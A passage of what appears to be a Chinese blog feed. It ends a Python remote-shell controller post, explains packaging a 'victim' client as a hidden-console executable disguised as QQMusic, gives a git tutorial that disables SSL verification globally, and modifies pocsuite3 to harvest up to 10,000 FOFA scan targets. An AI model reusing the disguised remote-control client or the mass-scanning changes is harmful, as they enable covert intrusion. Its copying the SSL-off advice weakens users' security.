class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">sock, data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;发送数据也解决粘包问题&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(data) == <span class="built_in">str</span>:</span><br><span class="line">        data = data.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment"># 新增发送命令的粘包解决方案</span></span><br><span class="line">    <span class="comment"># 计算命令长度 , 打包发送</span></span><br><span class="line">    cmd_len = struct.pack(<span class="string">&#x27;i&#x27;</span>, <span class="built_in">len</span>(data))</span><br><span class="line">    sock.send(cmd_len)</span><br><span class="line">    <span class="comment"># 发送命令</span></span><br><span class="line">    sock.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    server = socket.socket()</span><br><span class="line">    server.bind((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8082</span>))</span><br><span class="line">    server.listen(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;等待链接.....&quot;</span>)</span><br><span class="line">    conn, c_addr = server.accept()</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="built_in">input</span>(<span class="string">f&#x27;shell&gt;&#x27;</span>).strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> cmd:<span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> cmd == <span class="string">&quot;q&quot;</span>:</span><br><span class="line">                send_data(conn, cmd)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            send_data(conn,cmd)</span><br><span class="line">            <span class="comment"># 接收客户端发来的内容</span></span><br><span class="line">            data = recv_data(conn)</span><br><span class="line">            <span class="built_in">print</span>(data.decode(<span class="string">&quot;gbk&quot;</span>).strip())</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    conn.close()</span><br><span class="line">    server.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="4-py打包exe"><a href="#4-py打包exe" class="headerlink" title="4.py打包exe"></a>4.py打包exe</h2><p>安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pyinstaller</span><br></pre></td></tr></table></figure><p>打包命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F -w demo.py</span><br><span class="line"></span><br><span class="line">-F  打包成一个exe文件 </span><br><span class="line">-w 不显示黑窗口 (默认会显示) , 也可以用--noconsole参数 </span><br><span class="line">-i   指定图标 , .ico文件 或者是exe文件 , 会自动提取exe文件的图标</span><br><span class="line">-n  指定打包好的文件名</span><br></pre></td></tr></table></figure><p>打包好的程序在<code>dist</code>目录下 , dist是distribution的简写 , 发行版本</p><p>示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F -w client4(完美版).py -i &quot;C:\\Program Files (x86)\\Common Files\\Tencent\\QQMusic\\QQMusicService.exe&quot; -n qqmusic</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">pyinstaller -F -w 10.客户端(受害者).py -i &quot;C:\\Program Files (x86)\\Common Files\\Tencent\\QQMusic\\QQMusicService.exe&quot; -n main</span><br></pre></td></tr></table></figure><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220417171815369.png" alt="image-20220417171815369"></p><p>注意</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py不支持交叉编译 , 什么意思就是windows你只能打包成exe , 不能打包成linux上的可执行二进制文件</span><br></pre></td></tr></table></figure><p>可视化打包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pip3 install auto-py-to-exe</span><br><span class="line"></span><br><span class="line">auto-py-to-exe</span><br><span class="line"></span><br><span class="line">本质还是pyinstaller</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git初体验</title>
      <link href="/2023/04/02/git%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
      <url>/2023/04/02/git%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="1-什么是git"><a href="#1-什么是git" class="headerlink" title="1.什么是git"></a>1.什么是git</h2><p>Git（读音为&#x2F;gɪt&#x2F;）是一个开源的<strong>分布式版本控制系统</strong>，可以有效、高速地处理从很小到非常大的项目版本管理。 </p><p>也是[Linus Torvalds](<a href="https://baike.baidu.com/item/Linus">https://baike.baidu.com/item/Linus</a> Torvalds&#x2F;9336769)为了帮助管理Linux内核开发而开发的一个开放源码的版本控制软件。民间也有流传 , 是</p><p>Linus Torvalds , 看不惯当时的一些版本控制系统收费的现状 , 自己在小黑屋里写了两周搞出来的产物</p><p>Git 与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持</p><h2 id="2-为什么要有git"><a href="#2-为什么要有git" class="headerlink" title="2.为什么要有git"></a>2.为什么要有git</h2><p>在git出现之前 , 在一些企业中使用到的版本控制软件大都是svn , 自从git出现以后 , 就取代了svn的位置 , 下面是关于两者的区别</p><p>Git 不仅仅是个版本控制系统，它也是个内容管理系统(CMS)，工作管理系统等。</p><p>如果你是一个具有使用 SVN 背景的人，你需要做一定的思想转换，来适应 Git 提供的一些概念和特征。</p><p>Git 与 SVN 区别点：</p><ul><li><strong>1、Git 是分布式的，SVN 不是</strong>：这是 Git 和其它非分布式的版本控制系统，例如 SVN，CVS 等，最核心的区别。</li><li><strong>2、Git 把内容按元数据方式存储，而 SVN 是按文件：</strong>所有的资源控制系统都是把文件的元信息隐藏在一个类似 .svn、.cvs 等的文件夹里。</li><li><strong>3、Git 分支和 SVN 的分支不同：</strong>分支在 SVN 中一点都不特别，其实它就是版本库中的另外一个目录。</li><li><strong>4、Git 没有一个全局的版本号，而 SVN 有：</strong>目前为止这是跟 SVN 相比 Git 缺少的最大的一个特征。</li><li><strong>5、Git 的内容完整性要优于 SVN：</strong>Git 的内容存储使用的是 SHA-1 哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。</li></ul><h2 id="3-git的安装"><a href="#3-git的安装" class="headerlink" title="3.git的安装"></a>3.git的安装</h2><p>既然你要使用git的话 , 首先先要在你的平台上安装好git </p><p>git的下载地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://git-scm.com/downloads</span><br></pre></td></tr></table></figure><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220605193506427.png" alt="image-20220605193506427"></p><p><img src="https://i0.hdslb.com/bfs/album/5bb173a041be1c021e45f5c10d5b6926c8800178.png" alt="image-20220713144517758"></p><p>这里以windows为例子 , 直接点击下载 , 双击打开 , 下一步 , 下一步 安装即可</p><p>当你在任意目录下 , 右键有 git的方式 , 即为安装成功</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220605193724460.png" alt="image-20220605193724460"></p><h2 id="4-基础命令"><a href="#4-基础命令" class="headerlink" title="4.基础命令"></a>4.基础命令</h2><p>官方教程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://git-scm.com/docs</span><br></pre></td></tr></table></figure><h3 id="4-1注册账号"><a href="#4-1注册账号" class="headerlink" title="4.1注册账号"></a>4.1注册账号</h3><p>使用git之前 , 需要先初始化一个账号 , 可以使用下面的命令初始化</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;Your Name&quot;</span><br><span class="line">git config --global user.email &quot;email@example.com&quot;</span><br></pre></td></tr></table></figure><p>比如 , 我这里使用的是 mhx 和 <a href="mailto:&#x32;&#x37;&#51;&#51;&#54;&#x37;&#51;&#x33;&#53;&#55;&#x40;&#x71;&#x71;&#46;&#x63;&#111;&#x6d;">&#x32;&#x37;&#51;&#51;&#54;&#x37;&#51;&#x33;&#53;&#55;&#x40;&#x71;&#x71;&#46;&#x63;&#111;&#x6d;</a></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220605194355567.png" alt="image-20220605194355567"></p><h3 id="4-2初始化仓库"><a href="#4-2初始化仓库" class="headerlink" title="4.2初始化仓库"></a>4.2初始化仓库</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">初始化工作区域</span></span><br><span class="line">git init</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加文件</span></span><br><span class="line">git add &quot;文件名&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加当前目录下的所有文件</span></span><br><span class="line">git add . </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看工作区域状态</span></span><br><span class="line">git status</span><br></pre></td></tr></table></figure><h3 id="4-3github创建远程仓库"><a href="#4-3github创建远程仓库" class="headerlink" title="4.3github创建远程仓库"></a>4.3github创建远程仓库</h3><p>上面的初始化仓库命令 , 只是在本地创建好仓库 , 如果你想要你的仓库里面好玩的项目让别人也能看到 , 或者分享出来 , 你可以将你本地的仓库 , 推到远程仓库上 , 那么远程仓库如何创建呢 ? 你可以在使用github创建一个远程仓库 , 当然前提你要有一个github账号 , 这个申请注册非常的简单</p><p>创建仓库 , 登录你的github账号 , 点击 New repository</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220605200731707.png" alt="image-20220605200731707"></p><p>然后根据你的想法 , 设置仓库名称和描述</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220605200857770.png" alt="image-20220605200857770"></p><p>设置好 , 点击 Create repository , 即可 , 紧接着会跳转到</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220605201024574.png" alt="image-20220605201024574"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个新的本地仓库 , 然后推送到远程仓库</span></span><br><span class="line">echo &quot;# test&quot; &gt;&gt; README.md</span><br><span class="line">git init</span><br><span class="line">git add README.md    # 添加到暂存区</span><br><span class="line">git commit -m &quot;first commit&quot;  # 提交</span><br><span class="line">git branch -M main</span><br><span class="line">git remote add origin https://github.com/1derian/test.git</span><br><span class="line">git push -u origin main</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">本地已经有了一个仓库</span></span><br><span class="line">git remote add origin https://github.com/1derian/test.git</span><br><span class="line">git branch -M main</span><br><span class="line">git push -u origin main</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">推送代码（*）    <span class="comment"># 第一ci</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">初始化工作区域</span></span><br><span class="line">git init</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加当前目录下的所有文件</span></span><br><span class="line">git add . </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看工作区域状态</span></span><br><span class="line">git status</span><br><span class="line">git commit -m &quot;first commit&quot;  </span><br><span class="line">git branch -M main</span><br><span class="line">git remote add origin https://github.com/1derian/thinkphp5-rce.git</span><br><span class="line">git push -u origin main</span><br></pre></td></tr></table></figure><h3 id="4-4本地仓库推到远程"><a href="#4-4本地仓库推到远程" class="headerlink" title="4.4本地仓库推到远程"></a>4.4本地仓库推到远程</h3><p>这个我们使用第一种方式 , 创建新仓库 , 然后推送 , 糟糕的是这里报错了</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220605201536836.png" alt="image-20220605201536836"></p><p>不过问题不大 , 这个是ssl证书问题 , 我们可以设置忽略ssl证书的校验</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.sslVerify &quot;false&quot;</span><br></pre></td></tr></table></figure><p>如果 , 还提示10054 , 关闭git bash , 重新打开 , 再次执行 , 你会收到</p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220605202010688.png" alt="image-20220605202010688" style="zoom:80%;" /><p>输入你的github账号和密码</p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220605202059147.png" alt="image-20220605202059147" style="zoom:80%;" /><p>认证通过 , 你会看到这样的提示</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220605202140669.png" alt="image-20220605202140669"></p><p>然后你可以刷新你的github 仓库地址 , 就能看到仓库中的内容了</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220605202232022.png" alt="image-20220605202232022"></p><p>如果你遇到超时错误 , 你可以设置一个代理解决(*)</p><p><img src="C:\Users\23812\AppData\Roaming\Typora\typora-user-images\image-20220713195725231.png" alt="image-20220713195725231"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy ip:port</span><br><span class="line">git config --global https.proxy ip:port</span><br><span class="line"></span><br><span class="line">git config --global http.proxy 127.0.0.1:7890  (clash的代理)</span><br></pre></td></tr></table></figure><h3 id="4-5再次推送"><a href="#4-5再次推送" class="headerlink" title="4.5再次推送"></a>4.5再次推送</h3><p>当你的项目中又添加了好的想法 , 创建了新的文件 , 你想同步到你的远程仓库中 , 你可以这样做</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &quot;second commit&quot;  #git commit -m &quot;添加了readme&quot;</span><br><span class="line">git push -u origin main</span><br></pre></td></tr></table></figure><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220605202504209.png" alt="image-20220605202504209"></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220605202514794.png" alt="image-20220605202514794"></p><p>补充</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.gitignore 文件中可以设置忽略提交的文件/文件夹 , 该操作一定是在第一次git add . 之前</span><br></pre></td></tr></table></figure><p>比如我的工作目录下有一个config.txt , 不想推送到远程仓库中 , 你可以这样做</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220605204236660.png" alt="image-20220605204236660"></p><p>当然也支持 通配符 , ***.txt这种**</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target          //忽略这个target目录</span><br><span class="line">angular.json    //忽略这个angular.json文件</span><br><span class="line">log/*           //忽略log下的所有文件</span><br><span class="line">css/*.css       //忽略css目录下的.css文件</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &quot;third commit&quot;</span><br><span class="line">git push -u origin main</span><br></pre></td></tr></table></figure><p>刷新远程仓库查看</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220605204407371.png" alt="image-20220605204407371"></p><p>其他git命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清空git的工作区和暂存区</span></span><br><span class="line">git reset --hard</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看git commit 历史</span></span><br><span class="line">git log</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">git变更文件名</span></span><br><span class="line">git mv readme readme.md</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">git 强制推送</span></span><br><span class="line">git push -u origin main -f</span><br></pre></td></tr></table></figure><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>这些仅仅是git的九牛一毛 , 但是也够新手操作的了 , 关于git更多的玩法 , 你会在真实的项目中 , 以及解决的报错中慢慢的学习到git的强大</p><h2 id="6-发布项目"><a href="#6-发布项目" class="headerlink" title="6.发布项目"></a>6.发布项目</h2><p>当你开发一些工具 , 默认的模块已经满足不了你的需求了 , 你可能会使用到大量的第三方模块 , 一般在python中我们都知道在 <code>requirements.txt</code> 文件中会存放项目中使用的第三方模块 , 方便别人在使用你的脚本时,能够知道需要安装这些第三模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt     </span><br><span class="line"></span><br><span class="line"># 这个文件名是约定俗称的 requirements.txt</span><br></pre></td></tr></table></figure><p>如果你的项目有很多第三方 , 你可能都忘记了 , 有没有一种方式可以将项目中使用的第三方模块导出来呢?</p><p>有的 , 前提是你要先安装一个第三方模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pipreqs</span><br><span class="line">pipreqs ./ --encoding=utf-8</span><br></pre></td></tr></table></figure><h2 id="5-REDEME-md"><a href="#5-REDEME-md" class="headerlink" title="5.REDEME.md"></a>5.REDEME.md</h2>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pocsuit3二开</title>
      <link href="/2023/04/02/pocsuite3%E6%A1%86%E6%9E%B6%E4%BA%8C%E5%BC%80/"/>
      <url>/2023/04/02/pocsuite3%E6%A1%86%E6%9E%B6%E4%BA%8C%E5%BC%80/</url>
      
        <content type="html"><![CDATA[<h2 id="1-简单二开"><a href="#1-简单二开" class="headerlink" title="1.简单二开"></a>1.简单二开</h2><blockquote><p>找到你的pocsuite3在python下的安装路径 </p><p>D:\software\python3\Lib\site-packages\pocsuite3-1.9.6-py3.8.egg\pocsuite3</p></blockquote><h6 id="主要修改fofa不好用-以及没有保存（导入文件）的功能"><a href="#主要修改fofa不好用-以及没有保存（导入文件）的功能" class="headerlink" title="主要修改fofa不好用 , 以及没有保存（导入文件）的功能"></a>主要修改fofa不好用 , 以及没有保存（导入文件）的功能</h6><h3 id="1-1修改fofa满血版"><a href="#1-1修改fofa满血版" class="headerlink" title="1.1修改fofa满血版"></a>1.1修改fofa满血版</h3><p>1.定位到fofa插件中查询的最大条数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\software\python3\Lib\site-packages\pocsuite3\modules\fofa\__init__.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">self, dork, pages=<span class="number">1</span>, size=<span class="number">10000</span>, resource=<span class="string">&#x27;ip,port&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> resource == <span class="string">&#x27;host&#x27;</span>:</span><br><span class="line">        resource = <span class="string">&#x27;ip,port&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        resource = <span class="string">&#x27;host&#x27;</span></span><br><span class="line">    search_result = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, pages + <span class="number">1</span>):</span><br><span class="line">            url = (</span><br><span class="line">                <span class="string">&quot;https://fofa.info/api/v1/search/all?email=&#123;user&#125;&amp;key=&#123;token&#125;&amp;qbase64=&#123;dork&#125;&amp;&quot;</span></span><br><span class="line">                <span class="string">&quot;fields=&#123;resource&#125;&amp;page=&#123;page&#125;&amp;size=&#123;size&#125;&quot;</span></span><br><span class="line">            ).<span class="built_in">format</span>(user=self.user, token=self.token, dork=b64encode(dork.encode()).decode(),</span><br><span class="line">                     resource=resource, page=page, size=size)</span><br><span class="line">            resp = requests.get(url, timeout=<span class="number">80</span>, headers=self.headers)</span><br><span class="line">            <span class="keyword">if</span> resp <span class="keyword">and</span> resp.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;results&quot;</span> <span class="keyword">in</span> resp.json():</span><br><span class="line">                content = resp.json()</span><br><span class="line">                <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> content[<span class="string">&#x27;results&#x27;</span>]:</span><br><span class="line">                    <span class="keyword">if</span> resource == <span class="string">&quot;ip,port&quot;</span>:</span><br><span class="line">                        search_result.add(<span class="string">&quot;%s:%s&quot;</span> % (<span class="keyword">match</span>[<span class="number">0</span>], <span class="keyword">match</span>[<span class="number">1</span>]))</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">match</span>.startswith(<span class="string">&quot;https://&quot;</span>):</span><br><span class="line">                            search_result.add(<span class="string">&quot;http://&quot;</span> + <span class="keyword">match</span>)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            search_result.add(<span class="keyword">match</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                logger.error(<span class="string">&quot;[PLUGIN] Fofa:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(resp.text))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        logger.error(<span class="built_in">str</span>(ex))</span><br><span class="line">    <span class="keyword">return</span> search_result</span><br></pre></td></tr></table></figure><p>修改参数 fofa api的url</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220417143611131.png" alt="image-20220417143611131"></p><h3 id="1-2新增参数"><a href="#1-2新增参数" class="headerlink" title="1.2新增参数"></a>1.2新增参数</h3><p>虽然现在支持了最大查询条数 , 但是直接写成了 , 默认值参数 , 写死了 , 如果我只想检测1000个呢? 最好的做法是用户可以通过参数的值 , 指定最大的查询条数 , 而且默认验证后 , 只有终端输出 , 没有永久保存 , 可不可以指定一个保存路径的参数呢? 一个一个的来 , 不着急</p><p>添加自定义参数组 , 通过入口文件 , 一路最终 , 找到参数定义文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pocsuite3\lib\parse\cmd.py</span><br><span class="line">D:\software\python3\Lib\site-packages\pocsuite3-1.9.6-py3.8.egg\pocsuite3\lib\parse\cmd.py</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">diy.add_argument(<span class="string">&quot;--max-size&quot;</span>, dest=<span class="string">&quot;max_size&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">10000</span>,</span><br><span class="line">                             <span class="built_in">help</span>=<span class="string">&quot;Max size used in search fofa API&quot;</span>)</span><br><span class="line">diy.add_argument(<span class="string">&quot;--save-file&quot;</span>, dest=<span class="string">&quot;save_file&quot;</span>, action=<span class="string">&quot;store&quot;</span>, default=<span class="literal">None</span>,</span><br><span class="line">                 <span class="built_in">help</span>=<span class="string">&quot;save-file used in search fofa API&quot;</span>)</span><br></pre></td></tr></table></figure><p>追加以上两个参数</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220417150031414.png" alt="image-20220417150031414"></p><p>坑点：</p><p><img src="C:\Users\23812\AppData\Roaming\Typora\typora-user-images\image-20220713175315934.png" alt="image-20220713175315934"></p><p>同时还要在settings.py , 新增这两个字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pocsuite3\lib\core\settings.py</span><br><span class="line">还需要在python的安装目录下的这个文件也要添加</span><br><span class="line">D:\software\python3\Lib\site-packages\pocsuite3-1.9.6-py3.8.egg\pocsuite3\lib\core\settings.py</span><br><span class="line"></span><br><span class="line">&quot;max-size&quot;,</span><br><span class="line">&quot;save-file&quot;,</span><br></pre></td></tr></table></figure><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220417145912765.png" alt="image-20220417145912765"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pocsuite3\lib\core\optiondict.py</span><br><span class="line">D:\software\python3\Lib\site-packages\pocsuite3-1.9.6-py3.8.egg\pocsuite3\lib\core\optiondict.py</span><br><span class="line"></span><br><span class="line">&quot;max_size&quot;:&quot;integer&quot;,</span><br><span class="line">&quot;save_file&quot;:&quot;string&quot;,</span><br></pre></td></tr></table></figure><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220417152039451.png" alt="image-20220417152039451"></p><p>以及options.py中还要新增字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pocsuite3\lib\core\option.py</span><br><span class="line">D:\software\python3\Lib\site-packages\pocsuite3-1.9.6-py3.8.egg\pocsuite3\lib\core\option.py</span><br><span class="line"></span><br><span class="line">conf.max_size = 10000</span><br><span class="line">conf.save_file = None</span><br></pre></td></tr></table></figure><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220417150248606.png" alt="image-20220417150248606"></p><p>经过测试 , 会直接爆错 , 因为仅仅这样添加参数 , 是没有和我们search中的参数有任何的关系 , 就是没有传进入 , </p><p>继续跟踪框架 , 找到search函数的调用位置 , 就万事大吉了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite3\plugins\target_from_fofa.py</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">targets = self.fofa.search(dork, conf.max_page, conf.max_size, resource=conf.search_type)</span><br></pre></td></tr></table></figure><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220417144650395.png" 